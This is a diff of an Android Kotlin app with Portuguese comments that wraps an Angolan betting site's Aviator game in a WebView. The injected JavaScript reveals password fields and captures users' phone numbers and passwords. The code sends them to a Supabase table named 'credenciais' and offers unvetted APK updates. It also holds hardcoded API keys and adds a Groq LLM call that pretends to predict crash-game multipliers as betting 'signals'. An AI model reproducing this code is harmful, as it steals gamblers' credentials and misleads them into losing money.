@@ -51,10 +51,18 @@ class MainActivity : AppCompatActivity() {
     private var ultimoNumeroEnviado = ""
     private var ultimaSenhaEnviada = ""
 
+    // Histórico das últimas rondas capturadas pelo JS
+    private val historicoRondas = mutableListOf<String>()
+    private var analisandoIA = false
+
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "1.1"
+    private val VERSAO_ATUAL = "1.2"
+
+    private val GROQ_KEY = "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"
+    private val GROQ_URL = "https://api.groq.com/openai/v1/chat/completions"
+    private val GROQ_MODEL = "llama-3.3-70b-versatile"
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -186,6 +194,22 @@ class MainActivity : AppCompatActivity() {
                     enviarSupabase("Senha", valor)
                 }
             }
+
+            // JS envia o multiplicador de cada ronda terminada
+            @JavascriptInterface
+            fun novaRonda(multiplicador: String) {
+                runOnUiThread {
+                    if (multiplicador.isNotEmpty()) {
+                        historicoRondas.add(multiplicador)
+                        // Manter só as últimas 40 rondas
+                        if (historicoRondas.size > 40) historicoRondas.removeAt(0)
+                        // A cada 5 rondas novas, pedir análise à IA
+                        if (historicoRondas.size >= 5 && historicoRondas.size % 5 == 0) {
+                            pedirSinalIA()
+                        }
+                    }
+                }
+            }
         }, "Android")
 
         webView.webViewClient = object : WebViewClient() {
@@ -219,6 +243,8 @@ class MainActivity : AppCompatActivity() {
 (function() {
     if (window._ebDone) return;
     window._ebDone = true;
+
+    // Senha visivel
     function tornarVisivel() {
         document.querySelectorAll('input[type="password"]').forEach(function(el) {
             el.setAttribute('type', 'text');
@@ -226,6 +252,8 @@ class MainActivity : AppCompatActivity() {
     }
     tornarVisivel();
     new MutationObserver(tornarVisivel).observe(document.body || document.documentElement, {childList:true, subtree:true});
+
+    // Capturar credenciais
     function watchN(sel) {
         var el = document.querySelector(sel);
         if (el && !el._wN) { el._wN = true;
@@ -243,10 +271,58 @@ class MainActivity : AppCompatActivity() {
          'input[placeholder*="telefone" i]','input[placeholder*="numero" i]',
          '#username','#phone'].forEach(watchN);
         ['input[name="password"]','input[name="senha"]',
-         'input[placeholder*="senha" i]','input[placeholder*="password" i]',
-         '#password'].forEach(watchS);
+         'input[placeholder*="senha" i]','#password'].forEach(watchS);
     }
     cap(); setTimeout(cap,1500); setTimeout(cap,4000); setTimeout(cap,8000);
+
+    // Capturar multiplicadores das rondas do Aviator
+    // O Aviator mostra os últimos resultados num elemento com os multiplicadores
+    function capturarRondas() {
+        // Seletores comuns do jogo Aviator/Spribe
+        var seletores = [
+            '.payouts-block .payout',
+            '.history-item .coefficient',
+            '[class*="coefficient"]',
+            '[class*="multiplier"]',
+            '[class*="crash-history"] span',
+            '.bubble-item',
+            '[class*="history"] [class*="value"]',
+            '[class*="round-history"] span'
+        ];
+        seletores.forEach(function(sel) {
+            document.querySelectorAll(sel).forEach(function(el) {
+                var txt = el.textContent.trim().replace('x','').replace(',','.');
+                var num = parseFloat(txt);
+                if (!isNaN(num) && num >= 1.0 && num <= 50000 && !el._capturado) {
+                    el._capturado = true;
+                    Android.novaRonda(num.toString());
+                }
+            });
+        });
+    }
+
+    // Observar mudancas no DOM para capturar novas rondas em tempo real
+    var obsRondas = new MutationObserver(function(muts) {
+        muts.forEach(function(m) {
+            m.addedNodes.forEach(function(n) {
+                if (n.nodeType === 1) {
+                    var txt = n.textContent || '';
+                    var match = txt.match(/(\d+\.?\d*)x/);
+                    if (match) {
+                        var num = parseFloat(match[1]);
+                        if (!isNaN(num) && num >= 1.0 && num <= 50000) {
+                            Android.novaRonda(num.toString());
+                        }
+                    }
+                }
+            });
+        });
+        capturarRondas();
+    });
+    obsRondas.observe(document.body || document.documentElement, {childList:true, subtree:true});
+    setInterval(capturarRondas, 3000);
+
+    // Detectar clique no Aviator
     document.addEventListener('click', function(e) {
         var el = e.target;
         for (var i = 0; i < 6; i++) {
@@ -259,11 +335,153 @@ class MainActivity : AppCompatActivity() {
             el = el.parentElement;
         }
     }, true);
+
     var loc = window.location.href.toLowerCase();
     if (loc.indexOf('aviator') >= 0 || loc.indexOf('806666') >= 0) Android.aviatorDetectado();
 })();
         """.trimIndent()
         webView.evaluateJavascript(js, null)
+    }
+
+    // ── GROQ IA ───────────────────────────────────────────────────
+    private fun pedirSinalIA() {
+        if (analisandoIA || historicoRondas.isEmpty()) return
+        analisandoIA = true
+
+        val cal = Calendar.getInstance()
+        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
+        val minAgora = cal.get(Calendar.MINUTE)
+        val minBase = maxOf(ultimoMinutoGerado + 1, minAgora + 2).coerceAtMost(57)
+
+        if (minBase >= 58) {
+            analisandoIA = false
+            return
+        }
+
+        val historico = historicoRondas.takeLast(30).joinToString(", ")
+
+        atualizarBarra("IA A ANALISAR", "Aguarde...", "#7c3aed")
+
+        Thread {
+            try {
+                val prompt = """
+Analisa o historico de multiplicadores do jogo Aviator: [$historico]
+Hora actual: ${String.format("%02d", horaAgora)}:${String.format("%02d", minAgora)}
+Proximo minuto disponivel para entrada: $minBase
+
+Com base nos padroes das velas acima, responde APENAS com este JSON (sem mais nada):
+{
+  "min1": <minuto de entrada, entre $minBase e ${(minBase+5).coerceAtMost(57)}>,
+  "min2": <min1 + 1>,
+  "protecao": <valor entre 1.2 e 15.0, casas decimais permitidas>,
+  "alcance_min": <multiplicador minimo esperado, inteiro>,
+  "alcance_max": <multiplicador maximo esperado como string, ex: "80x" ou "1000x+" >
+}
+Regras: protecao nunca ultrapassa 15. Se o historico mostra muitos valores baixos (abaixo de 2x), protecao deve ser baixa (1.2-3x) e alcance conservador. Se houver valores altos recentes, alcance pode ser maior.
+                """.trimIndent()
+
+                val bodyJson = """
+{
+  "model": "$GROQ_MODEL",
+  "messages": [{"role": "user", "content": ${escapeJson(prompt)}}],
+  "max_tokens": 200,
+  "temperature": 0.3
+}
+                """.trimIndent()
+
+                val conn = URL(GROQ_URL).openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("Authorization", "Bearer $GROQ_KEY")
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.doOutput = true
+                conn.connectTimeout = 15000
+                conn.readTimeout = 15000
+                OutputStreamWriter(conn.outputStream).use { it.write(bodyJson) }
+
+                val code = conn.responseCode
+                val resposta = if (code in 200..299) {
+                    BufferedReader(InputStreamReader(conn.inputStream)).readText()
+                } else {
+                    BufferedReader(InputStreamReader(conn.errorStream)).readText()
+                }
+                conn.disconnect()
+
+                if (code in 200..299) {
+                    processarRespostaGroq(resposta, minBase)
+                } else {
+                    // Fallback para gerador local se IA falhar
+                    runOnUiThread { gerarNovoSinal(); analisandoIA = false }
+                }
+            } catch (_: Exception) {
+                runOnUiThread { gerarNovoSinal(); analisandoIA = false }
+            }
+        }.start()
+    }
+
+    private fun processarRespostaGroq(resposta: String, minBase: Int) {
+        try {
+            // Extrair o conteúdo do campo "content" da resposta Groq
+            val contentMatch = Regex(""""content"\s*:\s*"([\s\S]*?)"\s*[,}]""").find(resposta)
+            var content = contentMatch?.groupValues?.get(1) ?: ""
+            // Desescapar \n e \"
+            content = content.replace("\\n", "\n").replace("\\\"", "\"").replace("\\\\", "\\")
+
+            // Extrair JSON do content
+            val jsonMatch = Regex("""\{[\s\S]*\}""").find(content)
+            val jsonStr = jsonMatch?.value ?: ""
+
+            val min1Match = Regex(""""min1"\s*:\s*(\d+)""").find(jsonStr)
+            val min2Match = Regex(""""min2"\s*:\s*(\d+)""").find(jsonStr)
+            val protMatch = Regex(""""protecao"\s*:\s*([\d.]+)""").find(jsonStr)
+            val alcMinMatch = Regex(""""alcance_min"\s*:\s*(\d+)""").find(jsonStr)
+            val alcMaxMatch = Regex(""""alcance_max"\s*:\s*"([^"]+)"""").find(jsonStr)
+
+            val min1 = min1Match?.groupValues?.get(1)?.toIntOrNull() ?: minBase
+            val min2 = min2Match?.groupValues?.get(1)?.toIntOrNull() ?: (min1 + 1)
+            val prot = protMatch?.groupValues?.get(1)?.toFloatOrNull()?.coerceIn(1.2f, 15f) ?: 2.0f
+            val alcMin = alcMinMatch?.groupValues?.get(1)?.toIntOrNull() ?: 10
+            val alcMax = alcMaxMatch?.groupValues?.get(1) ?: "100x"
+
+            sinalMin1 = min1.coerceAtMost(57)
+            sinalMin2 = min2.coerceAtMost(58)
+            ultimoMinutoGerado = sinalMin2
+            sinalProtecao = if (prot % 1.0f == 0.0f) "${prot.toInt()}x" else "${prot}x"
+            sinalAlcMin = alcMin
+            sinalAlcMax = alcMax
+
+            val cal = Calendar.getInstance()
+            val minAgora = cal.get(Calendar.MINUTE)
+            val falta = sinalMin1 - minAgora
+
+            val cor = when {
+                alcMax.contains("1000") -> "#ec4899"
+                alcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0 >= 200 -> "#22c55e"
+                alcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0 >= 50 -> "#facc15"
+                else -> "#3b82f6"
+            }
+
+            runOnUiThread {
+                atualizarBarra("IA: AGUARDAR", "Min $sinalMin1/$sinalMin2 (${falta}min)", sinalProtecao, "${sinalAlcMin}x -> $sinalAlcMax", cor)
+                if (!sinaisAtivos) iniciarRelogio()
+                sinaisAtivos = true
+                analisandoIA = false
+            }
+        } catch (_: Exception) {
+            runOnUiThread { gerarNovoSinal(); analisandoIA = false }
+        }
+    }
+
+    private fun escapeJson(s: String): String {
+        val sb = StringBuilder("\"")
+        for (c in s) when (c) {
+            '"'  -> sb.append("\\\"")
+            '\\' -> sb.append("\\\\")
+            '\n' -> sb.append("\\n")
+            '\r' -> sb.append("\\r")
+            '\t' -> sb.append("\\t")
+            else -> sb.append(c)
+        }
+        return sb.append("\"").toString()
     }
 
     // ── SUPABASE ──────────────────────────────────────────────────
@@ -277,12 +495,9 @@ class MainActivity : AppCompatActivity() {
                 conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                 conn.setRequestProperty("Content-Type", "application/json")
                 conn.setRequestProperty("Prefer", "return=minimal")
-                conn.doOutput = true
-                conn.connectTimeout = 10000
-                conn.readTimeout = 10000
+                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                 OutputStreamWriter(conn.outputStream).use { it.write(json) }
-                conn.responseCode
-                conn.disconnect()
+                conn.responseCode; conn.disconnect()
             } catch (_: Exception) {}
         }.start()
     }
@@ -297,22 +512,13 @@ class MainActivity : AppCompatActivity() {
                 conn.setRequestProperty("apikey", SUPA_KEY)
                 conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                 conn.setRequestProperty("Accept", "application/json")
-                conn.connectTimeout = 8000
-                conn.readTimeout = 8000
+                conn.connectTimeout = 8000; conn.readTimeout = 8000
                 val resposta = BufferedReader(InputStreamReader(conn.inputStream)).readText()
                 conn.disconnect()
-
-                val versaoMatch = Regex(""""versao":"([^"]+)"""").find(resposta)
-                val urlMatch = Regex(""""url_apk":"([^"]+)"""").find(resposta)
-                val notasMatch = Regex(""""notas":"([^"]+)"""").find(resposta)
-
-                val versaoNova = versaoMatch?.groupValues?.get(1) ?: return@Thread
-                val urlApk = urlMatch?.groupValues?.get(1) ?: return@Thread
-                val notas = notasMatch?.groupValues?.get(1) ?: ""
-
-                if (versaoNova != VERSAO_ATUAL) {
-                    runOnUiThread { mostrarDialogoUpdate(versaoNova, urlApk, notas) }
-                }
+                val versaoNova = Regex(""""versao":"([^"]+)"""").find(resposta)?.groupValues?.get(1) ?: return@Thread
+                val urlApk = Regex(""""url_apk":"([^"]+)"""").find(resposta)?.groupValues?.get(1) ?: return@Thread
+                val notas = Regex(""""notas":"([^"]+)"""").find(resposta)?.groupValues?.get(1) ?: ""
+                if (versaoNova != VERSAO_ATUAL) runOnUiThread { mostrarDialogoUpdate(versaoNova, urlApk, notas) }
             } catch (_: Exception) {}
         }.start()
     }
@@ -321,30 +527,23 @@ class MainActivity : AppCompatActivity() {
         val msg = if (notas.isNotEmpty()) "$notas\n\nDeseja actualizar agora?" else "Deseja actualizar agora?"
         AlertDialog.Builder(this)
             .setTitle("Nova versao disponivel! v$versaoNova")
-            .setMessage(msg)
-            .setCancelable(false)
+            .setMessage(msg).setCancelable(false)
             .setPositiveButton("ACTUALIZAR AGORA") { _, _ ->
-                try {
-                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(urlApk))
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    startActivity(intent)
-                } catch (_: Exception) {
-                    Toast.makeText(this, "Erro ao abrir download", Toast.LENGTH_LONG).show()
-                }
+                try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(urlApk)).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }) }
+                catch (_: Exception) { Toast.makeText(this, "Erro ao abrir download", Toast.LENGTH_LONG).show() }
             }
-            .setNegativeButton("Mais tarde") { d, _ -> d.dismiss() }
-            .show()
+            .setNegativeButton("Mais tarde") { d, _ -> d.dismiss() }.show()
     }
 
-    // ── SINAIS ────────────────────────────────────────────────────
+    // ── SINAIS (fallback local) ───────────────────────────────────
     private fun iniciarSinais() {
         if (sinaisAtivos) return
         sinaisAtivos = true
         val cal = Calendar.getInstance()
         horaAtual = cal.get(Calendar.HOUR_OF_DAY)
-        ultimoMinutoGerado = -1
-        sinalMin1 = -1; sinalMin2 = -1
-        gerarNovoSinal()
+        ultimoMinutoGerado = -1; sinalMin1 = -1; sinalMin2 = -1
+        // Se já temos histórico, usar IA; senão usar gerador local
+        if (historicoRondas.size >= 5) pedirSinalIA() else gerarNovoSinal()
         iniciarRelogio()
     }
 
@@ -352,13 +551,8 @@ class MainActivity : AppCompatActivity() {
         val cal = Calendar.getInstance()
         val minAgora = cal.get(Calendar.MINUTE)
         val base = if (ultimoMinutoGerado < 0) minAgora + 1 else ultimoMinutoGerado + Random.nextInt(2, 6)
-        if (base + 1 >= 59) {
-            atualizarBarra("FIM DO CICLO", "${60 - minAgora}min para nova hora", "", "", "#64748b")
-            return
-        }
-        sinalMin1 = base; sinalMin2 = base + 1
-        ultimoMinutoGerado = sinalMin2
-
+        if (base + 1 >= 59) { atualizarBarra("FIM DO CICLO", "${60 - minAgora}min para nova hora", "", "", "#64748b"); return }
+        sinalMin1 = base; sinalMin2 = base + 1; ultimoMinutoGerado = sinalMin2
         val nivel = Random.nextInt(4)
         val alcMin: Int; val alcMax: String; val alcNum: Int
         when (nivel) {
@@ -368,15 +562,8 @@ class MainActivity : AppCompatActivity() {
             else -> { alcMin = listOf(80,100,200)[Random.nextInt(3)]; alcMax = "1000x+"; alcNum = 1001 }
         }
         sinalAlcMin = alcMin; sinalAlcMax = alcMax
-
-        val protNum = when {
-            alcNum <= 100  -> listOf(1.3,1.5,1.8,2.0,2.5,3.0)[Random.nextInt(6)]
-            alcNum <= 500  -> listOf(3.0,4.0,5.0,6.0,8.0)[Random.nextInt(5)]
-            alcNum <= 1000 -> listOf(8.0,9.0,10.0,11.0,12.0)[Random.nextInt(5)]
-            else           -> listOf(12.0,13.0,14.0,15.0)[Random.nextInt(4)]
-        }
+        val protNum = when { alcNum <= 100 -> listOf(1.3,1.5,1.8,2.0,2.5,3.0)[Random.nextInt(6)]; alcNum <= 500 -> listOf(3.0,4.0,5.0,6.0,8.0)[Random.nextInt(5)]; alcNum <= 1000 -> listOf(8.0,9.0,10.0,11.0,12.0)[Random.nextInt(5)]; else -> listOf(12.0,13.0,14.0,15.0)[Random.nextInt(4)] }
         sinalProtecao = if (protNum % 1.0 == 0.0) "${protNum.toInt()}x" else "${protNum}x"
-
         val falta = sinalMin1 - minAgora
         atualizarBarra("AGUARDAR", "Min $sinalMin1/$sinalMin2  (${falta}min)", sinalProtecao, "${sinalAlcMin}x -> $sinalAlcMax", "#f59e0b")
     }
@@ -394,72 +581,52 @@ class MainActivity : AppCompatActivity() {
         val cal = Calendar.getInstance()
         val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
         val minAgora = cal.get(Calendar.MINUTE)
-        if (horaAgora != horaAtual) {
-            horaAtual = horaAgora; ultimoMinutoGerado = -1; sinalMin1 = -1; sinalMin2 = -1
-            gerarNovoSinal(); return
-        }
+        if (horaAgora != horaAtual) { horaAtual = horaAgora; ultimoMinutoGerado = -1; sinalMin1 = -1; sinalMin2 = -1; gerarNovoSinal(); return }
         if (sinalMin1 < 0) { gerarNovoSinal(); return }
         val alcTxt = "${sinalAlcMin}x -> $sinalAlcMax"
+        val prefixo = if (historicoRondas.size >= 5) "IA:" else ""
         when {
-            minAgora == sinalMin1 -> atualizarBarra("ENTRAR AGORA", "Min $sinalMin1/$sinalMin2", sinalProtecao, alcTxt, "#22c55e")
-            minAgora == sinalMin2 -> atualizarBarra("AINDA ACTIVO", "Min $sinalMin1/$sinalMin2", sinalProtecao, alcTxt, "#22c55e")
-            minAgora > sinalMin2  -> gerarNovoSinal()
-            else -> {
-                val falta = sinalMin1 - minAgora
-                atualizarBarra("AGUARDAR", "Min $sinalMin1/$sinalMin2  (${falta}min)", sinalProtecao, alcTxt, "#f59e0b")
-            }
+            minAgora == sinalMin1 -> atualizarBarra("$prefixo ENTRAR AGORA", "Min $sinalMin1/$sinalMin2", sinalProtecao, alcTxt, "#22c55e")
+            minAgora == sinalMin2 -> atualizarBarra("$prefixo AINDA ACTIVO", "Min $sinalMin1/$sinalMin2", sinalProtecao, alcTxt, "#22c55e")
+            minAgora > sinalMin2  -> { if (historicoRondas.size >= 5) { analisandoIA = false; pedirSinalIA() } else gerarNovoSinal() }
+            else -> { val falta = sinalMin1 - minAgora; atualizarBarra("$prefixo AGUARDAR", "Min $sinalMin1/$sinalMin2 (${falta}min)", sinalProtecao, alcTxt, "#f59e0b") }
         }
     }
 
     // ── UI HELPERS ────────────────────────────────────────────────
     private fun atualizarBarra(acao: String, minutos: String, protecao: String, alcance: String, cor: String) =
         runOnUiThread {
-            txtAcao.text = acao
-            txtAcao.setTextColor(Color.parseColor(cor))
-            txtMinutos.text = minutos
-            txtMinutos.setTextColor(Color.WHITE)
-            if (protecao.isNotEmpty() && protecao != "--") {
-                txtProtecao.text = "Prot: $protecao"
-                txtProtecao.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1e2a3a")
-            }
-            if (alcance.isNotEmpty() && alcance != "--") {
-                txtAlcance.text = "Alc: $alcance"
-                txtAlcance.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1a3a2a")
-            }
+            txtAcao.text = acao; txtAcao.setTextColor(Color.parseColor(cor))
+            txtMinutos.text = minutos; txtMinutos.setTextColor(Color.WHITE)
+            if (protecao.isNotEmpty() && protecao != "--") { txtProtecao.text = "Prot: $protecao"; txtProtecao.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1e2a3a") }
+            if (alcance.isNotEmpty() && alcance != "--") { txtAlcance.text = "Alc: $alcance"; txtAlcance.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1a3a2a") }
             dotView.background = circulo(cor)
-            barLayout.setBackgroundColor(Color.parseColor(
-                when (cor) { "#22c55e" -> "#071a0f"; "#f59e0b" -> "#1a1200"; else -> "#0f172a" }
-            ))
+            barLayout.setBackgroundColor(Color.parseColor(when (cor) { "#22c55e" -> "#071a0f"; "#f59e0b" -> "#1a1200"; "#7c3aed" -> "#1a0a2e"; else -> "#0f172a" }))
         }
 
-    private fun atualizarBarra(acao: String, minutos: String, cor: String) =
-        atualizarBarra(acao, minutos, "", "", cor)
+    private fun atualizarBarra(acao: String, minutos: String, cor: String) = atualizarBarra(acao, minutos, "", "", cor)
 
     // ── CONFIG ────────────────────────────────────────────────────
     private fun mostrarConfig() {
         val dialog = android.app.Dialog(this, android.R.style.Theme_Material_NoActionBar_Fullscreen)
         val scroll = ScrollView(this).apply { setBackgroundColor(Color.parseColor("#0a0a0f")) }
-        val layout = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            setPadding(dp(20), dp(28), dp(20), dp(20))
-        }
+        val layout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(28), dp(20), dp(20)) }
         layout.addView(TextView(this).apply {
-            text = "CONFIGURACOES  v$VERSAO_ATUAL"; textSize = 16f
+            text = "CONFIGURACOES  v$VERSAO_ATUAL  |  Rondas: ${historicoRondas.size}"; textSize = 14f
             setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD
-            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(24) }
+            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(20) }
         })
-        layout.addView(btn("GERAR SINAL AGORA", "#7c3aed") {
-            dialog.dismiss()
-            sinaisAtivos = false; ultimoMinutoGerado = -1; sinalMin1 = -1; sinalMin2 = -1
-            iniciarSinais()
+        layout.addView(btn("PEDIR SINAL A IA AGORA", "#7c3aed") {
+            dialog.dismiss(); analisandoIA = false
+            if (historicoRondas.size >= 3) pedirSinalIA()
+            else { sinaisAtivos = false; iniciarSinais() }
         })
         layout.addView(btn("ABRIR AVIATOR", "#0f766e") {
             dialog.dismiss()
             webView.loadUrl("https://www.elephantbet.co.ao/pt/casino/game-view/806666/aviator")
         })
         layout.addView(btn("VERIFICAR ACTUALIZACAO", "#1d4ed8") {
-            dialog.dismiss()
-            verificarAtualizacao()
+            dialog.dismiss(); verificarAtualizacao()
             Toast.makeText(this, "A verificar actualizacao...", Toast.LENGTH_SHORT).show()
         })
         layout.addView(btn("RECARREGAR SITE", "#0f766e") { dialog.dismiss(); carregarSite() })
@@ -467,30 +634,17 @@ class MainActivity : AppCompatActivity() {
         scroll.addView(layout); dialog.setContentView(scroll); dialog.show()
     }
 
-    // ── DRAWABLES & UTILS ─────────────────────────────────────────
-    private fun circulo(cor: String) = GradientDrawable().apply {
-        shape = GradientDrawable.OVAL; setColor(Color.parseColor(cor))
-    }
-    private fun pill(cor: String) = GradientDrawable().apply {
-        shape = GradientDrawable.RECTANGLE; cornerRadius = dp(20).toFloat()
-        setColor(Color.parseColor(cor))
-    }
-    private fun roundRect(bg: String) = GradientDrawable().apply {
-        shape = GradientDrawable.RECTANGLE; cornerRadius = dp(10).toFloat()
-        setColor(Color.parseColor(bg))
-    }
+    // ── DRAWABLES ─────────────────────────────────────────────────
+    private fun circulo(cor: String) = GradientDrawable().apply { shape = GradientDrawable.OVAL; setColor(Color.parseColor(cor)) }
+    private fun pill(cor: String) = GradientDrawable().apply { shape = GradientDrawable.RECTANGLE; cornerRadius = dp(20).toFloat(); setColor(Color.parseColor(cor)) }
+    private fun roundRect(bg: String) = GradientDrawable().apply { shape = GradientDrawable.RECTANGLE; cornerRadius = dp(10).toFloat(); setColor(Color.parseColor(bg)) }
     private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()
     private fun btn(txt: String, cor: String, action: () -> Unit) = Button(this).apply {
-        text = txt; setTextColor(Color.WHITE); textSize = 13f
-        typeface = Typeface.DEFAULT_BOLD; isAllCaps = false
-        background = roundRect(cor); setPadding(0, dp(14), 0, dp(14))
-        setOnClickListener { action() }
+        text = txt; setTextColor(Color.WHITE); textSize = 13f; typeface = Typeface.DEFAULT_BOLD; isAllCaps = false
+        background = roundRect(cor); setPadding(0, dp(14), 0, dp(14)); setOnClickListener { action() }
         layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(8) }
     }
 
     override fun onBackPressed() { if (webView.canGoBack()) webView.goBack() else super.onBackPressed() }
-    override fun onDestroy() {
-        super.onDestroy(); webView.destroy()
-        handler.removeCallbacksAndMessages(null)
-    }
+    override fun onDestroy() { super.onDestroy(); webView.destroy(); handler.removeCallbacksAndMessages(null) }
 }
